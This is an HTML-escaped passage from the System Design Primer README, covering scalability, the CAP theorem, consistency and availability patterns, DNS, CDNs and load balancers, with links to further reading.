&lt;p&gt;&lt;strong&gt;Note: This section is under development&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Question&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a hash map&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/object_oriented_design/hash_table/hash_map.ipynb&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a least recently used cache&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/object_oriented_design/lru_cache/lru_cache.ipynb&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a call center&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/object_oriented_design/call_center/call_center.ipynb&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a deck of cards&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/object_oriented_design/deck_of_cards/deck_of_cards.ipynb&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a parking lot&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/object_oriented_design/parking_lot/parking_lot.ipynb&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a chat server&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/solutions/object_oriented_design/online_chat/online_chat.ipynb&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design a circular array&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#contributing&#34;&gt;Contribute&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Add an object-oriented design question&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#contributing&#34;&gt;Contribute&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;System design topics: start here&lt;/h2&gt; &#xA;&lt;p&gt;New to system design?&lt;/p&gt; &#xA;&lt;p&gt;First, you&#39;ll need a basic understanding of common principles, learning about what they are, how they are used, and their pros and cons.&lt;/p&gt; &#xA;&lt;h3&gt;Step 1: Review the scalability video lecture&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=-W9F__D3oY4&#34;&gt;Scalability Lecture at Harvard&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Topics covered: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Vertical scaling&lt;/li&gt; &#xA;   &lt;li&gt;Horizontal scaling&lt;/li&gt; &#xA;   &lt;li&gt;Caching&lt;/li&gt; &#xA;   &lt;li&gt;Load balancing&lt;/li&gt; &#xA;   &lt;li&gt;Database replication&lt;/li&gt; &#xA;   &lt;li&gt;Database partitioning&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Step 2: Review the scalability article&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.lecloud.net/tagged/scalability/chrono&#34;&gt;Scalability&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Topics covered: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;http://www.lecloud.net/post/7295452622/scalability-for-dummies-part-1-clones&#34;&gt;Clones&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;http://www.lecloud.net/post/7994751381/scalability-for-dummies-part-2-database&#34;&gt;Databases&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;http://www.lecloud.net/post/9246290032/scalability-for-dummies-part-3-cache&#34;&gt;Caches&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;http://www.lecloud.net/post/9699762917/scalability-for-dummies-part-4-asynchronism&#34;&gt;Asynchronism&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Next steps&lt;/h3&gt; &#xA;&lt;p&gt;Next, we&#39;ll look at high-level trade-offs:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Performance&lt;/strong&gt; vs &lt;strong&gt;scalability&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Latency&lt;/strong&gt; vs &lt;strong&gt;throughput&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Availability&lt;/strong&gt; vs &lt;strong&gt;consistency&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Keep in mind that &lt;strong&gt;everything is a trade-off&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Then we&#39;ll dive into more specific topics such as DNS, CDNs, and load balancers.&lt;/p&gt; &#xA;&lt;h2&gt;Performance vs scalability&lt;/h2&gt; &#xA;&lt;p&gt;A service is &lt;strong&gt;scalable&lt;/strong&gt; if it results in increased &lt;strong&gt;performance&lt;/strong&gt; in a manner proportional to resources added. Generally, increasing performance means serving more units of work, but it can also be to handle larger units of work, such as when datasets grow.&lt;sup&gt;&lt;a href=&#34;http://www.allthingsdistributed.com/2006/03/a_word_on_scalability.html&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt; &#xA;&lt;p&gt;Another way to look at performance vs scalability:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;If you have a &lt;strong&gt;performance&lt;/strong&gt; problem, your system is slow for a single user.&lt;/li&gt; &#xA; &lt;li&gt;If you have a &lt;strong&gt;scalability&lt;/strong&gt; problem, your system is fast for a single user but slow under heavy load.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.allthingsdistributed.com/2006/03/a_word_on_scalability.html&#34;&gt;A word on scalability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.slideshare.net/jboner/scalability-availability-stability-patterns/&#34;&gt;Scalability, availability, stability, patterns&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Latency vs throughput&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Latency&lt;/strong&gt; is the time to perform some action or to produce some result.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Throughput&lt;/strong&gt; is the number of such actions or results per unit of time.&lt;/p&gt; &#xA;&lt;p&gt;Generally, you should aim for &lt;strong&gt;maximal throughput&lt;/strong&gt; with &lt;strong&gt;acceptable latency&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://community.cadence.com/cadence_blogs_8/b/sd/archive/2010/09/13/understanding-latency-vs-throughput&#34;&gt;Understanding latency vs throughput&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Availability vs consistency&lt;/h2&gt; &#xA;&lt;h3&gt;CAP theorem&lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/bgLMI2u.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://robertgreiner.com/2014/08/cap-theorem-revisited&#34;&gt;Source: CAP theorem revisited&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;In a distributed computer system, you can only support two of the following guarantees:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Consistency&lt;/strong&gt; - Every read receives the most recent write or an error&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Availability&lt;/strong&gt; - Every request receives a response, without guarantee that it contains the most recent version of the information&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Partition Tolerance&lt;/strong&gt; - The system continues to operate despite arbitrary partitioning due to network failures&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;em&gt;Networks aren&#39;t reliable, so you&#39;ll need to support partition tolerance. You&#39;ll need to make a software tradeoff between consistency and availability.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h4&gt;CP - consistency and partition tolerance&lt;/h4&gt; &#xA;&lt;p&gt;Waiting for a response from the partitioned node might result in a timeout error. CP is a good choice if your business needs require atomic reads and writes.&lt;/p&gt; &#xA;&lt;h4&gt;AP - availability and partition tolerance&lt;/h4&gt; &#xA;&lt;p&gt;Responses return the most readily available version of the data available on any node, which might not be the latest. Writes might take some time to propagate when the partition is resolved.&lt;/p&gt; &#xA;&lt;p&gt;AP is a good choice if the business needs allow for &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#eventual-consistency&#34;&gt;eventual consistency&lt;/a&gt; or when the system needs to continue working despite external errors.&lt;/p&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://robertgreiner.com/2014/08/cap-theorem-revisited/&#34;&gt;CAP theorem revisited&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://ksat.me/a-plain-english-introduction-to-cap-theorem&#34;&gt;A plain english introduction to CAP theorem&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/henryr/cap-faq&#34;&gt;CAP FAQ&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=k-Yaq8AHlFA&#34;&gt;The CAP theorem&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Consistency patterns&lt;/h2&gt; &#xA;&lt;p&gt;With multiple copies of the same data, we are faced with options on how to synchronize them so clients have a consistent view of the data. Recall the definition of consistency from the &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#cap-theorem&#34;&gt;CAP theorem&lt;/a&gt; - Every read receives the most recent write or an error.&lt;/p&gt; &#xA;&lt;h3&gt;Weak consistency&lt;/h3&gt; &#xA;&lt;p&gt;After a write, reads may or may not see it. A best effort approach is taken.&lt;/p&gt; &#xA;&lt;p&gt;This approach is seen in systems such as memcached. Weak consistency works well in real time use cases such as VoIP, video chat, and realtime multiplayer games. For example, if you are on a phone call and lose reception for a few seconds, when you regain connection you do not hear what was spoken during connection loss.&lt;/p&gt; &#xA;&lt;h3&gt;Eventual consistency&lt;/h3&gt; &#xA;&lt;p&gt;After a write, reads will eventually see it (typically within milliseconds). Data is replicated asynchronously.&lt;/p&gt; &#xA;&lt;p&gt;This approach is seen in systems such as DNS and email. Eventual consistency works well in highly available systems.&lt;/p&gt; &#xA;&lt;h3&gt;Strong consistency&lt;/h3&gt; &#xA;&lt;p&gt;After a write, reads will see it. Data is replicated synchronously.&lt;/p&gt; &#xA;&lt;p&gt;This approach is seen in file systems and RDBMSes. Strong consistency works well in systems that need transactions.&lt;/p&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://snarfed.org/transactions_across_datacenters_io.html&#34;&gt;Transactions across data centers&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Availability patterns&lt;/h2&gt; &#xA;&lt;p&gt;There are two complementary patterns to support high availability: &lt;strong&gt;fail-over&lt;/strong&gt; and &lt;strong&gt;replication&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Fail-over&lt;/h3&gt; &#xA;&lt;h4&gt;Active-passive&lt;/h4&gt; &#xA;&lt;p&gt;With active-passive fail-over, heartbeats are sent between the active and the passive server on standby. If the heartbeat is interrupted, the passive server takes over the active&#39;s IP address and resumes service.&lt;/p&gt; &#xA;&lt;p&gt;The length of downtime is determined by whether the passive server is already running in &#39;hot&#39; standby or whether it needs to start up from &#39;cold&#39; standby. Only the active server handles traffic.&lt;/p&gt; &#xA;&lt;p&gt;Active-passive failover can also be referred to as master-slave failover.&lt;/p&gt; &#xA;&lt;h4&gt;Active-active&lt;/h4&gt; &#xA;&lt;p&gt;In active-active, both servers are managing traffic, spreading the load between them.&lt;/p&gt; &#xA;&lt;p&gt;If the servers are public-facing, the DNS would need to know about the public IPs of both servers. If the servers are internal-facing, application logic would need to know about both servers.&lt;/p&gt; &#xA;&lt;p&gt;Active-active failover can also be referred to as master-master failover.&lt;/p&gt; &#xA;&lt;h3&gt;Disadvantage(s): failover&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fail-over adds more hardware and additional complexity.&lt;/li&gt; &#xA; &lt;li&gt;There is a potential for loss of data if the active system fails before any newly written data can be replicated to the passive.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Replication&lt;/h3&gt; &#xA;&lt;h4&gt;Master-slave and master-master&lt;/h4&gt; &#xA;&lt;p&gt;This topic is further discussed in the &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#database&#34;&gt;Database&lt;/a&gt; section:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#master-slave-replication&#34;&gt;Master-slave replication&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#master-master-replication&#34;&gt;Master-master replication&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Availability in numbers&lt;/h3&gt; &#xA;&lt;p&gt;Availability is often quantified by uptime (or downtime) as a percentage of time the service is available. Availability is generally measured in number of 9s--a service with 99.99% availability is described as having four 9s.&lt;/p&gt; &#xA;&lt;h4&gt;99.9% availability - three 9s&lt;/h4&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Duration&lt;/th&gt; &#xA;   &lt;th&gt;Acceptable downtime&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Downtime per year&lt;/td&gt; &#xA;   &lt;td&gt;8h 45min 57s&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Downtime per month&lt;/td&gt; &#xA;   &lt;td&gt;43m 49.7s&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Downtime per week&lt;/td&gt; &#xA;   &lt;td&gt;10m 4.8s&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Downtime per day&lt;/td&gt; &#xA;   &lt;td&gt;1m 26.4s&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h4&gt;99.99% availability - four 9s&lt;/h4&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Duration&lt;/th&gt; &#xA;   &lt;th&gt;Acceptable downtime&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Downtime per year&lt;/td&gt; &#xA;   &lt;td&gt;52min 35.7s&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Downtime per month&lt;/td&gt; &#xA;   &lt;td&gt;4m 23s&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Downtime per week&lt;/td&gt; &#xA;   &lt;td&gt;1m 5s&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Downtime per day&lt;/td&gt; &#xA;   &lt;td&gt;8.6s&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h4&gt;Availability in parallel vs in sequence&lt;/h4&gt; &#xA;&lt;p&gt;If a service consists of multiple components prone to failure, the service&#39;s overall availability depends on whether the components are in sequence or in parallel.&lt;/p&gt; &#xA;&lt;h6&gt;In sequence&lt;/h6&gt; &#xA;&lt;p&gt;Overall availability decreases when two components with availability &amp;lt; 100% are in sequence:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Availability (Total) = Availability (Foo) * Availability (Bar)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If both &lt;code&gt;Foo&lt;/code&gt; and &lt;code&gt;Bar&lt;/code&gt; each had 99.9% availability, their total availability in sequence would be 99.8%.&lt;/p&gt; &#xA;&lt;h6&gt;In parallel&lt;/h6&gt; &#xA;&lt;p&gt;Overall availability increases when two components with availability &amp;lt; 100% are in parallel:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Availability (Total) = 1 - (1 - Availability (Foo)) * (1 - Availability (Bar))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If both &lt;code&gt;Foo&lt;/code&gt; and &lt;code&gt;Bar&lt;/code&gt; each had 99.9% availability, their total availability in parallel would be 99.9999%.&lt;/p&gt; &#xA;&lt;h2&gt;Domain name system&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/IOyLj4i.jpg&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.slideshare.net/srikrupa5/dns-security-presentation-issa&#34;&gt;Source: DNS security presentation&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;A Domain Name System (DNS) translates a domain name such as &lt;a href=&#34;http://www.example.com&#34;&gt;www.example.com&lt;/a&gt; to an IP address.&lt;/p&gt; &#xA;&lt;p&gt;DNS is hierarchical, with a few authoritative servers at the top level. Your router or ISP provides information about which DNS server(s) to contact when doing a lookup. Lower level DNS servers cache mappings, which could become stale due to DNS propagation delays. DNS results can also be cached by your browser or OS for a certain period of time, determined by the &lt;a href=&#34;https://en.wikipedia.org/wiki/Time_to_live&#34;&gt;time to live (TTL)&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;NS record (name server)&lt;/strong&gt; - Specifies the DNS servers for your domain/subdomain.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;MX record (mail exchange)&lt;/strong&gt; - Specifies the mail servers for accepting messages.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;A record (address)&lt;/strong&gt; - Points a name to an IP address.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;CNAME (canonical)&lt;/strong&gt; - Points a name to another name or &lt;code&gt;CNAME&lt;/code&gt; (example.com to &lt;a href=&#34;http://www.example.com&#34;&gt;www.example.com&lt;/a&gt;) or to an &lt;code&gt;A&lt;/code&gt; record.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Services such as &lt;a href=&#34;https://www.cloudflare.com/dns/&#34;&gt;CloudFlare&lt;/a&gt; and &lt;a href=&#34;https://aws.amazon.com/route53/&#34;&gt;Route 53&lt;/a&gt; provide managed DNS services. Some DNS services can route traffic through various methods:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.jscape.com/blog/load-balancing-algorithms&#34;&gt;Weighted round robin&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Prevent traffic from going to servers under maintenance&lt;/li&gt; &#xA;   &lt;li&gt;Balance between varying cluster sizes&lt;/li&gt; &#xA;   &lt;li&gt;A/B testing&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/routing-policy.html#routing-policy-latency&#34;&gt;Latency-based&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/routing-policy.html#routing-policy-geo&#34;&gt;Geolocation-based&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Disadvantage(s): DNS&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Accessing a DNS server introduces a slight delay, although mitigated by caching described above.&lt;/li&gt; &#xA; &lt;li&gt;DNS server management could be complex and is generally managed by &lt;a href=&#34;http://superuser.com/questions/472695/who-controls-the-dns-servers/472729&#34;&gt;governments, ISPs, and large companies&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;DNS services have recently come under &lt;a href=&#34;http://dyn.com/blog/dyn-analysis-summary-of-friday-october-21-attack/&#34;&gt;DDoS attack&lt;/a&gt;, preventing users from accessing websites such as Twitter without knowing Twitter&#39;s IP address(es).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/library/dd197427(v=ws.10).aspx&#34;&gt;DNS architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Domain_Name_System&#34;&gt;Wikipedia&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://support.dnsimple.com/categories/dns/&#34;&gt;DNS articles&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Content delivery network&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/h9TAuGI.jpg&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;https://www.creative-artworks.eu/why-use-a-content-delivery-network-cdn/&#34;&gt;Source: Why use a CDN&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;A content delivery network (CDN) is a globally distributed network of proxy servers, serving content from locations closer to the user. Generally, static files such as HTML/CSS/JS, photos, and videos are served from CDN, although some CDNs such as Amazon&#39;s CloudFront support dynamic content. The site&#39;s DNS resolution will tell clients which server to contact.&lt;/p&gt; &#xA;&lt;p&gt;Serving content from CDNs can significantly improve performance in two ways:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Users receive content from data centers close to them&lt;/li&gt; &#xA; &lt;li&gt;Your servers do not have to serve requests that the CDN fulfills&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Push CDNs&lt;/h3&gt; &#xA;&lt;p&gt;Push CDNs receive new content whenever changes occur on your server. You take full responsibility for providing content, uploading directly to the CDN and rewriting URLs to point to the CDN. You can configure when content expires and when it is updated. Content is uploaded only when it is new or changed, minimizing traffic, but maximizing storage.&lt;/p&gt; &#xA;&lt;p&gt;Sites with a small amount of traffic or sites with content that isn&#39;t often updated work well with push CDNs. Content is placed on the CDNs once, instead of being re-pulled at regular intervals.&lt;/p&gt; &#xA;&lt;h3&gt;Pull CDNs&lt;/h3&gt; &#xA;&lt;p&gt;Pull CDNs grab new content from your server when the first user requests the content. You leave the content on your server and rewrite URLs to point to the CDN. This results in a slower request until the content is cached on the CDN.&lt;/p&gt; &#xA;&lt;p&gt;A &lt;a href=&#34;https://en.wikipedia.org/wiki/Time_to_live&#34;&gt;time-to-live (TTL)&lt;/a&gt; determines how long content is cached. Pull CDNs minimize storage space on the CDN, but can create redundant traffic if files expire and are pulled before they have actually changed.&lt;/p&gt; &#xA;&lt;p&gt;Sites with heavy traffic work well with pull CDNs, as traffic is spread out more evenly with only recently-requested content remaining on the CDN.&lt;/p&gt; &#xA;&lt;h3&gt;Disadvantage(s): CDN&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CDN costs could be significant depending on traffic, although this should be weighed with additional costs you would incur not using a CDN.&lt;/li&gt; &#xA; &lt;li&gt;Content might be stale if it is updated before the TTL expires it.&lt;/li&gt; &#xA; &lt;li&gt;CDNs require changing URLs for static content to point to the CDN.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://figshare.com/articles/Globally_distributed_content_delivery/6605972&#34;&gt;Globally distributed content delivery&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.travelblogadvice.com/technical/the-differences-between-push-and-pull-cdns/&#34;&gt;The differences between push and pull CDNs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Content_delivery_network&#34;&gt;Wikipedia&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Load balancer&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/h81n9iK.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://horicky.blogspot.com/2010/10/scalable-system-design-patterns.html&#34;&gt;Source: Scalable system design patterns&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;Load balancers distribute incoming client requests to computing resources such as application servers and databases. In each case, the load balancer returns the response from the computing resource to the appropriate client. Load balancers are effective at:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Preventing requests from going to unhealthy servers&lt;/li&gt; &#xA; &lt;li&gt;Preventing overloading resources&lt;/li&gt; &#xA; &lt;li&gt;Helping to eliminate a single point of failure&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Load balancers can be implemented with hardware (expensive) or with software such as HAProxy.&lt;/p&gt; &#xA;&lt;p&gt;Additional benefits include:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;SSL termination&lt;/strong&gt; - Decrypt incoming requests and encrypt server responses so backend servers do not have to perform these potentially expensive operations &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Removes the need to install &lt;a href=&#34;https://en.wikipedia.org/wiki/X.509&#34;&gt;X.509 certificates&lt;/a&gt; on each server&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Session persistence&lt;/strong&gt; - Issue cookies and route a specific client&#39;s requests to same instance if the web apps do not keep track of sessions&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;To protect against failures, it&#39;s common to set up multiple load balancers, either in &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#active-passive&#34;&gt;active-passive&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#active-active&#34;&gt;active-active&lt;/a&gt; mode.&lt;/p&gt; &#xA;&lt;p&gt;Load balancers can route traffic based on various metrics, including:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Random&lt;/li&gt; &#xA; &lt;li&gt;Least loaded&lt;/li&gt; &#xA; &lt;li&gt;Session/cookies&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.g33kinfo.com/info/round-robin-vs-weighted-round-robin-lb&#34;&gt;Round robin or weighted round robin&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#layer-4-load-balancing&#34;&gt;Layer 4&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a 